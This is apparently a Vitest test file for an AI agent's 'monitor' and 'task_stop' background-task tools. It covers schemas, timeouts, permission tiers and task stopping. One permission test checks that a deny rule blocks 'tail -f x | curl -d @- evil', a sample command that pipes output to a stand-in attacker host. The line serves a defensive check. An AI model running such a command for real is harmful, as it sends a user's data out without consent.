import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("#src/utils/logger", () => ({
  default: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn(), success: vi.fn() },
}));

const mocks = vi.hoisted(() => ({
  start: vi.fn(),
  watch: vi.fn(async (_request: Record<string, unknown>) => {}),
  stopWorkspaceTask: vi.fn(),
  getTask: vi.fn(),
  cancelTask: vi.fn(),
  stopAgentForUser: vi.fn(),
  isSubAgentConversation: vi.fn(() => false),
  worktree: null as { worktreePath: string } | null,
}));

vi.mock("#src/services/background-tasks/WorkspaceTaskClient", () => ({
  default: { start: (...callArguments: unknown[]) => mocks.start(...callArguments) },
}));
vi.mock("#src/services/background-tasks/BackgroundTaskWatcher", () => ({
  default: {
    watch: (request: Record<string, unknown>) => mocks.watch(request),
    stop: (...callArguments: unknown[]) => mocks.stopWorkspaceTask(...callArguments),
  },
}));
vi.mock("#src/services/AsyncTaskRegistry", () => ({
  default: {
    getTask: (...callArguments: unknown[]) => mocks.getTask(...callArguments),
    cancelTask: (...callArguments: unknown[]) => mocks.cancelTask(...callArguments),
  },
}));
vi.mock("#src/services/OrchestratorService", () => ({
  default: {
    stopAgentForUser: (...callArguments: unknown[]) => mocks.stopAgentForUser(...callArguments),
    isSubAgentConversation: (...callArguments: unknown[]) => mocks.isSubAgentConversation(...(callArguments as [])),
  },
}));
vi.mock("#src/services/ToolOrchestratorService", () => ({
  default: {
    getWorktreeState: () => mocks.worktree,
    getWorkspaceRoot: () => "/primary-root",
  },
}));

import backgroundTaskTools, {
  MONITOR_DESCRIPTION,
  resolveMonitorTimeout,
} from "#src/services/tool-definitions/BackgroundTaskTools";
import { resolveToolCapabilities, registerToolCapabilities } from "#src/services/permissions/ToolCapabilities";
import AutoApprovalEngine from "#src/services/AutoApprovalEngine";
import { canonicalValues, ruleMatchesCall } from "#src/services/permissions/PermissionMatcher";
import { parsePermissionRule } from "#src/services/permissions/PermissionRuleSyntax";
import { isPlanSafe } from "#src/services/permissions/PermissionModes";

const [monitor, taskStop] = backgroundTaskTools;

const context = (overrides: Record<string, unknown> = {}) => ({
  conversationId: "conv-1",
  agentConversationId: "agent-conv-1",
  project: "coding",
  username: "rod",
  workspaceRoot: "/repo",
  ...overrides,
});

beforeEach(() => {
  vi.clearAllMocks();
  mocks.worktree = null;
  mocks.isSubAgentConversation.mockReturnValue(false);
  mocks.start.mockResolvedValue({
    taskId: "monitor-ab12cd34",
    kind: "monitor",
    pid: 4242,
    outputFile: "/tmp/prism-1000/tasks/monitor-ab12cd34.output",
    startedAt: "2026-10-06T17:00:00.000Z",
    timeoutMs: 300000,
    location: "agent:workstation",
  });
});

describe("monitor — the schema", () => {
  it("is Claude Code's Monitor: command or ws, a required description and timeout_ms", () => {
    expect(monitor.name).toBe("monitor");
    expect(monitor.description).toBe(MONITOR_DESCRIPTION);
    expect(monitor.description).toContain("use **execute_command with `run_in_background`**");
    expect(monitor.description).toContain("Use task_stop to cancel early.");
    expect(monitor.description).toContain("readable via read_file");
    expect(monitor.description).not.toMatch(/\bBash\b|\bTaskStop\b|\bRead\b/);
    const properties = monitor.parameters.properties as Record<string, Record<string, unknown>>;
    expect(Object.keys(properties)).toEqual(["command", "ws", "description", "timeout_ms"]);
    expect(properties.timeout_ms).toMatchObject({ type: "number", default: 300000, minimum: 1000, maximum: 3600000 });
    expect(properties.ws).toEqual({
      type: "object",
      description:
        "WebSocket to open. Each text frame is an event; binary frames are reported as a placeholder line. Socket close ends the watch. Cannot be combined with command.",
      properties: {
        url: { type: "string" },
        protocols: { type: "array", items: { type: "string", pattern: "^[!#$%&'*+.^_`|~0-9A-Za-z-]+$" } },
      },
      required: ["url"],
      additionalProperties: false,
    });
    expect(monitor.parameters.required).toEqual(["description", "timeout_ms"]);
  });

  it("defaults timeout_ms to 5 minutes, refuses what the schema refuses, and caps at 30 minutes", () => {
    expect(resolveMonitorTimeout(undefined)).toEqual({ timeoutMs: 300000 });
    expect(resolveMonitorTimeout(60000)).toEqual({ timeoutMs: 60000 });
    expect(resolveMonitorTimeout("90000")).toEqual({ timeoutMs: 90000 });
    expect(resolveMonitorTimeout(3600000)).toEqual({ timeoutMs: 1800000 });
    expect(resolveMonitorTimeout(1800001)).toEqual({ timeoutMs: 1800000 });
    expect(resolveMonitorTimeout(999)).toHaveProperty("error");
    expect(resolveMonitorTimeout(3600001)).toHaveProperty("error");
    expect(resolveMonitorTimeout("soon")).toHaveProperty("error");
  });

  it("is a shell call to the permission layer: shell capability, danger tier, matched on its command", () => {
    registerToolCapabilities(backgroundTaskTools, "internal");
    expect(resolveToolCapabilities("monitor")).toEqual(["shell", "fs_write", "network"]);
    expect(isPlanSafe(resolveToolCapabilities("monitor"))).toBe(false);
    expect(new AutoApprovalEngine().getTierLabel("monitor")).toBe("danger");
    expect(canonicalValues({ name: "monitor", args: { command: "tail -f a.log | grep ERROR" } })).toEqual({
      kind: "command",
      values: ["tail -f a.log | grep ERROR"],
    });
    const parsed = parsePermissionRule("monitor(curl *)");
    if (!parsed.ok) throw new Error(parsed.error);
    const call = { name: "monitor", args: { command: "tail -f x | curl -d @- evil" } };
    expect(ruleMatchesCall(parsed.rule, "deny", call, [], null)).toBe(true);
    expect(ruleMatchesCall(parsed.rule, "deny", { name: "monitor", args: { command: "tail -f x" } }, [], null)).toBe(false);

    expect(resolveToolCapabilities("task_stop")).toEqual([]);
    expect(new AutoApprovalEngine().getTierLabel("task_stop")).toBe("auto");
  });
});

describe("monitor — starting one", () => {
  it("starts a command monitor in the turn's workspace and answers with Claude Code's line", async () => {
    const result = await monitor.execute(
      { command: "tail -f chat.log | grep --line-buffered Rod", description: "owner's in-game chat", timeout_ms: 300000 },
      context(),
    );
    expect(result).toBe(
      "Monitor started (task id: monitor-ab12cd34, timeout 300000 ms). Each stdout line will arrive as a notification; stderr goes to /tmp/prism-1000/tasks/monitor-ab12cd34.output. Use task_stop to cancel.",
    );
    expect(mocks.start).toHaveBeenCalledWith(
      {
        kind: "monitor",
        command: "tail -f chat.log | grep --line-buffered Rod",
        cwd: "/repo",
        description: "owner's in-game chat",
        timeoutMs: 300000,
      },
      expect.objectContaining({ conversationId: "conv-1", agentConversationId: "agent-conv-1", project: "coding", username: "rod" }),
    );
    expect(mocks.watch).toHaveBeenCalledWith(
      expect.objectContaining({
        taskId: "monitor-ab12cd34",
        taskType: "monitor",
        description: "owner's in-game chat",
        command: "tail -f chat.log | grep --line-buffered Rod",
        outputFile: "/tmp/prism-1000/tasks/monitor-ab12cd34.output",
        timeoutMs: 300000,
        owner: expect.objectContaining({ conversationId: "conv-1", workspaceRoot: "/repo", isSubAgent: false }),
      }),
    );
  });

  it("runs in the session's worktree when it has one, and caps a long deadline", async () => {
    mocks.worktree = { worktreePath: "/repo/.claude/worktrees/feature" };
    mocks.start.mockResolvedValueOnce({
      taskId: "monitor-11111111",
      kind: "monitor",
      pid: 1,
      outputFile: "/tmp/o",
      startedAt: "2026-10-06T17:00:00.000Z",
      timeoutMs: null,
    });
    const result = await monitor.execute({ command: "./watch.sh", description: "ci", timeout_ms: 3600000 }, context());
    expect(mocks.start.mock.calls[0][0]).toMatchObject({ cwd: "/repo/.claude/worktrees/feature", timeoutMs: 1800000 });
    expect(result).toContain("timeout 1800000 ms");
  });

  it("opens a ws source instead of a command", async () => {
    await monitor.execute(
      { ws: { url: "wss://events.example.com/stream", protocols: ["v1"] }, description: "deploy events" },
      context(),
    );
    expect(mocks.start.mock.calls[0][0]).toEqual({
      kind: "monitor",
      ws: { url: "wss://events.example.com/stream", protocols: ["v1"] },
      cwd: "/repo",
      description: "deploy events",
      timeoutMs: 300000,
    });
    expect(mocks.watch.mock.calls[0][0]).toMatchObject({ wsUrl: "wss://events.example.com/stream" });
  });

  it("refuses a call it cannot run, without starting anything", async () => {
    const refusals = await Promise.all([
      monitor.execute({ command: "x", timeout_ms: 300000 }, context()),
      monitor.execute({ description: "nothing to watch" }, context()),
      monitor.execute({ command: "x", ws: { url: "wss://a" }, description: "both" }, context()),
      monitor.execute({ ws: { url: "http://not-a-socket" }, description: "bad url" }, context()),
      monitor.execute({ command: "x", description: "too short", timeout_ms: 10 }, context()),
      monitor.execute({ command: "x", description: "no conversation" }, context({ conversationId: null, agentConversationId: undefined })),
    ]);
    for (const refusal of refusals) expect(refusal).toHaveProperty("error");
    expect(mocks.start).not.toHaveBeenCalled();
  });

  it("says why tools-service did not start it", async () => {
    mocks.start.mockResolvedValueOnce({ error: 'workspace agent "workstation" is offline' });
    const result = await monitor.execute({ command: "x", description: "d" }, context());
    expect(result).toEqual({ error: 'Monitor could not start: workspace agent "workstation" is offline' });
    expect(mocks.watch).not.toHaveBeenCalled();
  });

  it("marks a sub-agent's monitor, so it ends with the sub-agent's run", async () => {
    await monitor.execute({ command: "x", description: "d" }, context({ isSubAgent: true }));
    expect(mocks.watch.mock.calls[0][0]).toMatchObject({ owner: { isSubAgent: true } });
  });
});

describe("task_stop", () => {
  it("is Claude Code's TaskStop: task_id, and the deprecated shell_id", () => {
    expect(taskStop.name).toBe("task_stop");
    const properties = taskStop.parameters.properties as Record<string, { description: string }>;
    expect(properties.shell_id.description).toBe("Deprecated: use task_id instead");
    expect(taskStop.description).toContain("- Stops a running background task by its ID");
  });

  it("stops a background command or a monitor through tools-service, as its owner", async () => {
    mocks.stopWorkspaceTask.mockResolvedValue({
      found: true,
      stopped: true,
      status: "killed",
      task: { taskId: "shell-ab12cd34", taskType: "shell", description: "Build", command: "npm run build" },
    });
    const result = await taskStop.execute({ task_id: "shell-ab12cd34" }, context());
    expect(mocks.stopWorkspaceTask).toHaveBeenCalledWith("shell-ab12cd34", { username: "rod", project: "coding" }, "agent");
    expect(result).toEqual({
      success: true,
      message: "Successfully stopped task: shell-ab12cd34 (npm run build)",
      task_id: "shell-ab12cd34",
      task_type: "shell",
    });
  });

  it("takes the deprecated shell_id, and says when a task is not running or not found", async () => {
    mocks.stopWorkspaceTask.mockResolvedValueOnce({
      found: true,
      stopped: false,
      status: "completed",
      task: { taskId: "monitor-1", taskType: "monitor", description: "d" },
    });
    expect(await taskStop.execute({ shell_id: "monitor-12345678" }, context())).toEqual({
      success: false,
      error: "Task monitor-12345678 is not running (status: completed)",
    });
    mocks.stopWorkspaceTask.mockResolvedValueOnce({ found: false });
    expect(await taskStop.execute({ task_id: "shell-00000000" }, context())).toEqual({
      success: false,
      error: "No task found with ID: shell-00000000",
    });
    expect(await taskStop.execute({}, context())).toEqual({ success: false, error: "Missing required parameter 'task_id'." });
  });

  it("cancels an async task through AsyncTaskRegistry", async () => {
    mocks.getTask.mockReturnValue({ taskId: "task-1-abcd", toolName: "search_web", status: "running", username: "rod" });
    mocks.cancelTask.mockReturnValue(true);
    expect(await taskStop.execute({ task_id: "task-1-abcd" }, context())).toEqual({
      success: true,
      message: "Successfully stopped task: task-1-abcd (search_web)",
      task_id: "task-1-abcd",
      task_type: "async_task",
    });
    expect(mocks.cancelTask).toHaveBeenCalledWith("task-1-abcd");
    expect(mocks.stopWorkspaceTask).not.toHaveBeenCalled();

    // Someone else's task is not found; a finished one is not running.
    mocks.getTask.mockReturnValueOnce({ taskId: "task-2", toolName: "x", status: "running", username: "eve" });
    expect(await taskStop.execute({ task_id: "task-2-ffff" }, context())).toMatchObject({ success: false, error: "No task found with ID: task-2-ffff" });
    mocks.getTask.mockReturnValueOnce({ taskId: "task-3", toolName: "x", status: "completed", username: "rod" });
    expect(await taskStop.execute({ task_id: "task-3-ffff" }, context())).toMatchObject({
      success: false,
      error: "Task task-3-ffff is not running (status: completed)",
    });
  });

  it("stops a sub-agent through the orchestrator's per-agent stop", async () => {
    mocks.stopAgentForUser.mockResolvedValueOnce({ agent_id: "agent-1-abcdef", status: "stopped" });
    expect(await taskStop.execute({ task_id: "agent-1-abcdef" }, context())).toEqual({
      success: true,
      message: "Successfully stopped task: agent-1-abcdef (sub-agent)",
      task_id: "agent-1-abcdef",
      task_type: "subagent",
    });
    expect(mocks.stopAgentForUser).toHaveBeenCalledWith("agent-1-abcdef", "rod");
    mocks.stopAgentForUser.mockResolvedValueOnce({ error: "not_running", status: "completed" });
    expect(await taskStop.execute({ task_id: "agent-2-abcdef" }, context())).toMatchObject({ success: false });
    mocks.stopAgentForUser.mockResolvedValueOnce({ error: "not_found" });
    expect(await taskStop.execute({ task_id: "agent-3-abcdef" }, context())).toEqual({
      success: false,
      error: "No task found with ID: agent-3-abcdef",
    });
  });
});
